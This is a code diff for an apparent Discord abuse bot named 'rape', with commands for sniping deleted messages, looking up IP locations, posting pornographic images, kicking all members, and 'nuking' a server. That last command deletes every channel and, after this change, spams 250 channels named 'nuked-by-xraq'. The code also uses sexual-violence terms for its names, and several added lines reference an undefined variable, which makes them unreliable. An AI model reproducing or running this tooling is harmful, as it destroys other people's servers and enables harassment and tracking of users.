@@ -35,7 +35,7 @@ class rape:
                     "prefix": ">",
                     "color": "0x6495ed",
                     "del_after": 10,
-                    "footer": "rape v1",
+                    "footer": "rape v2",
                     "presense": "True"
                 }
                 json.dump(setup_data, fp, indent=4)
@@ -99,7 +99,7 @@ snipe_message_content = {}
 async def on_message_delete(message):
      snipe_message_author[message.channel.id] = message.author
      snipe_message_content[message.channel.id] = message.content
-     await asyncio.sleep(1000000000000000)
+     await asyncio.sleep(10000000000000000)
      del snipe_message_author[message.channel.id]
      del snipe_message_content[message.channel.id]
     
@@ -475,14 +475,14 @@ async def iplookup(ctx, ip: str=None):
                         await ctx.send(f'**{ip} Info**\n\nCity: {j["city"]}\nRegion: {j["region"]}\nCountry: {j["country"]}\nCoordinates: {j["loc"]}\nPostal: {j["postal"]}\nTimezone: {j["timezone"]}\nOrganization: {j["org"]}')
         except Exception as e:
             await ctx.send(f"Error: {e}")
-            # skidripped this because it looked better than the one i was using lmao
 
 @bot.command()
 async def lesbian(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/les")
     res = r.json()
-    em = discord.Embed()
+    em = discord.Embed(color= 0x6495ED)
+    embed.set_footer(text=" enjoy the lesbian hentai")
     em.set_image(url=res['url'])
     await ctx.send(embed=em)
 
@@ -514,7 +514,7 @@ async def leet(ctx, *, message: str=None):
                     leetmsg = leetmsg.replace('you', 'j00')
 
             embed= discord.Embed(color= 0x6495ED, title="Leet", description=f"{leetmsg.upper()}",timestamp=datetime.utcfromtimestamp(time.time()))
-            embed.set_thumbnail(url="https://i.imgur.com/TR2cv3C.jpg")
+            embed.set_thumbnail(url="https://cdn.mos.cms.futurecdn.net/gxVgEMNDT8BUPLRaJRuTEB-970-80.png.webp")
             embed.set_footer(text=" RapeV1")
             await ctx.send(embed=embed)
         except discord.HTTPException:
@@ -537,7 +537,8 @@ async def hentai(ctx):
     await ctx.message.delete()
     r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
     res = r.json()
-    embed = discord.Embed()
+    embed = discord.Embed(color= 0x6495ED)
+    embed.set_footer(text=" enjoy the hentai")
     embed.set_image(url=res['url'])
     await ctx.send(embed=embed)
 
@@ -606,7 +607,8 @@ async def pussy(ctx):
         with io.BytesIO(image) as file:
             await ctx.send(file=discord.File(file, f"rape_pussy.gif"))
     except:
-        em = discord.Embed()
+        em = discord.Embed(color= 0x6495ED)
+        embed.set_footer(text=" enjoy the hentai")
         em.set_image(url=res['url'])
         await ctx.send(embed=em)
         
@@ -623,7 +625,8 @@ async def anal(ctx):
         with io.BytesIO(image) as file:
             await ctx.send(file=discord.File(file, f"bot_anal.gif"))
     except:
-        em = discord.Embed()
+        em = discord.Embed(color= 0x6495ED)
+        embed.set_footer(text=" enjoy the anal hentai")
         em.set_image(url=res['url'])
         await ctx.send(embed=em)
 
@@ -639,7 +642,7 @@ async def boobs(ctx):
         with io.BytesIO(image) as file:
             await ctx.send(file=discord.File(file, f"rape_boobs.gif"))
     except:
-        em = discord.Embed()
+        em = discord.Embed(color= 0x6495ED)
         em.set_image(url=res['url'])
         await ctx.send(embed=em) 
 
@@ -655,7 +658,8 @@ async def blowjob(ctx):
         with io.BytesIO(image) as file:
             await ctx.send(file=discord.File(file, f"rape_blowjob.gif"))
     except:
-        em = discord.Embed()
+        em = discord.Embed(color= 0x6495ED)
+        embed.set_footer(text=" enjoy the blowjob hentai")
         em.set_image(url=res['url'])
         await ctx.send(embed=em)
 
@@ -704,7 +708,7 @@ async def kickall(ctx):
 
 @bot.command()
 async def rape(ctx):
-    # LOL
+    # use at your own risk 
     print('Deleting all...')
     
     print('Deleting channels..')
@@ -718,7 +722,7 @@ async def rape(ctx):
         else:
             print(f"{channel.name} has been deleted in {ctx.guild.name}")
 
-    for _i in range(10):
+    for _i in range(250):
         await ctx.guild.create_text_channel(name="nuked-by-xraq")
         print(f"{_i} channel(s) have been deleted")
 
